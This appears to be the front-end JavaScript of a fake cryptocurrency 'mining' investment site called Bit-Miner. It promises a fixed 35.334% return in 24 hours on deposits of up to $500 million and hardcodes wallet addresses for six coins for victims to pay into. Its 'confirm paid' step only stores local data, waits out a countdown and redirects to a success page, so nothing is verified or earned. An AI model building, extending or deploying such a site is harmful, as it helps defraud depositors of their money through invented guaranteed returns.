// ============================================================
// Bit-Miner – CENTRAL SETTINGS (change values ONLY here)
// ============================================================
const MINING_RETURN_PERCENT = 35.334;
const MIN_DEPOSIT = 1000;
const MAX_DEPOSIT = 500000000;
const MINING_DURATION = "24 Hours";
const COUNTDOWN_SECONDS = 120;

// Mining balance – change this ONE number and it updates everywhere
const MINING_BALANCE_BTC = 0.000001;

const CRYPTO_ADDRESSES = {
  BTC: "bc1qcpye0af8274vw0fyqg9w5y5q0hmsvc9ulyd7ts",
  TRX: "TDMs1k82gQjmyoJffpRd9DrXaAUPvMG4Mg",
  ETH: "0x93e010544c9a97c37c1b90b256606280e8f2337f",
  SOL: "JCZ1Qrqh7SAic7edWj56FpV9SNvk2zUuqMEqnEDRfB5P",
  XRP: "rDFNcEJTG8JPWvKDMp96Rj3mgiWz1D5gec",
  USDT: "TDMs1k82gQjmyoJffpRd9DrXaAUPvMG4Mg"
  
};

// Make balance available to other scripts (app.js)
window.MINING_BALANCE_BTC = MINING_BALANCE_BTC;

const money = n => "$" + Number(n).toLocaleString("en-US", {
  minimumFractionDigits: 2,
  maximumFractionDigits: 2
});

const save = (k, v) => localStorage.setItem(k, JSON.stringify(v));
const load = (k, d = null) => {
  try {
    return JSON.parse(localStorage.getItem(k)) ?? d;
  } catch {
    return d;
  }
};

// ---- Show selected deposit + earnings on any page that has the elements ----
function showDepositAmount() {
  const amountEl = document.getElementById("displayAmount");
  const earnEl = document.getElementById("displayEarnings");
  if (!amountEl) return;

  const deposit = load("miningDeposit");
  if (deposit && deposit.amount) {
    const amount = Number(deposit.amount);
    const percent = deposit.percent || MINING_RETURN_PERCENT;
    const earnings = amount * (percent / 100);

    amountEl.textContent = money(amount);
    if (earnEl) {
      earnEl.textContent = "+" + money(earnings) + " earn";
    }
  } else {
    amountEl.textContent = money(0);
    if (earnEl) earnEl.textContent = "+$0.00 earn";
  }
}
showDepositAmount();

// ---- Deposit slider page (LOGARITHMIC for smooth control) ----
const slider = document.getElementById("depositSlider");
if (slider) {
  // Slider UI is linear 0 → 1000, we map it to log scale of real amount
  const SLIDER_MAX = 1000;
  slider.min = 0;
  slider.max = SLIDER_MAX;
  slider.step = 1;
  slider.value = 0; // start at minimum

  const minLog = Math.log(MIN_DEPOSIT);
  const maxLog = Math.log(MAX_DEPOSIT);

  // Convert slider position (0-1000) → real USD amount
  function posToAmount(pos) {
    const t = Number(pos) / SLIDER_MAX;
    let amount = Math.exp(minLog + t * (maxLog - minLog));
    // Nice rounding so it doesn't show ugly decimals
    if (amount < 5000) amount = Math.round(amount / 10) * 10;
    else if (amount < 50000) amount = Math.round(amount / 50) * 50;
    else if (amount < 500000) amount = Math.round(amount / 100) * 100;
    else if (amount < 5000000) amount = Math.round(amount / 1000) * 1000;
    else if (amount < 50000000) amount = Math.round(amount / 10000) * 10000;
    else amount = Math.round(amount / 100000) * 100000;
    return Math.min(MAX_DEPOSIT, Math.max(MIN_DEPOSIT, amount));
  }

  // Convert real amount → slider position (for initial value)
  function amountToPos(amount) {
    const log = Math.log(Math.max(MIN_DEPOSIT, Math.min(MAX_DEPOSIT, amount)));
    return Math.round(((log - minLog) / (maxLog - minLog)) * SLIDER_MAX);
  }

  function update() {
    const amount = posToAmount(slider.value);
    const earnings = amount * (MINING_RETURN_PERCENT / 100);
    document.getElementById("amount").textContent = money(amount);
    document.getElementById("rate").textContent = MINING_RETURN_PERCENT + "%";
    document.getElementById("earnings").textContent = money(earnings);
    document.getElementById("total").textContent = money(amount + earnings);
    // store current amount on the slider element for the continue button
    slider.dataset.amount = amount;
  }

  update();
  slider.addEventListener("input", update);

  document.getElementById("continueBtn").onclick = () => {
    const amount = Number(slider.dataset.amount) || posToAmount(slider.value);
    save("miningDeposit", {
      amount: amount,
      duration: MINING_DURATION,
      percent: MINING_RETURN_PERCENT
    });
    location.href = "crypto.html";
  };
}

// ---- Crypto selection ----
document.querySelectorAll(".crypto-card").forEach(card => {
  card.onclick = () => {
    save("selectedCrypto", card.dataset.crypto);
    location.href = "crypto-address.html";
  };
});

// ---- Crypto address page ----
const cryptoName = document.getElementById("cryptoName");
if (cryptoName) {
  const crypto = load("selectedCrypto", "BTC");
  const address = CRYPTO_ADDRESSES[crypto] || "ADDRESS";
  cryptoName.textContent = crypto;
  document.getElementById("cryptoAddress").value = address;
  document.getElementById("coinIcon").textContent =
    crypto === "BTC" ? "₿" :
crypto === "USDT" ? "₮" :
crypto === "ETH" ? "Ξ" :
crypto === "SOL" ? "◎" :
crypto === "XRP" ? "✕" :
"TRX";

  document.getElementById("copyAddress").onclick = async () => {
    try {
      await navigator.clipboard.writeText(address);
    } catch {}
    document.getElementById("copyAddress").textContent = "Copied ✓";
  };

  document.getElementById("addressContinue").onclick = () => {
    location.href = "payment-confirmation.html";
  };
}

// ---- Payment confirmation page ----
const confirmPaid = document.getElementById("confirmPaid");
if (confirmPaid) {
  let remaining = COUNTDOWN_SECONDS;
  const countdown = document.getElementById("countdown");

  function tick() {
    const m = Math.floor(remaining / 60);
    const s = remaining % 60;
    countdown.textContent =
      String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0");
    if (remaining <= 0) {
      clearInterval(timer);
      confirmPaid.disabled = false;
      return;
    }
    remaining--;
  }

  tick();
  const timer = setInterval(tick, 1000);

  confirmPaid.onclick = () => {
    document.getElementById("loader").classList.add("show");
    save("miningSubmission", {
      deposit: load("miningDeposit"),
      crypto: load("selectedCrypto"),
      submittedAt: new Date().toISOString()
    });
    setTimeout(() => (location.href = "success.html"), 1500);
  };
}
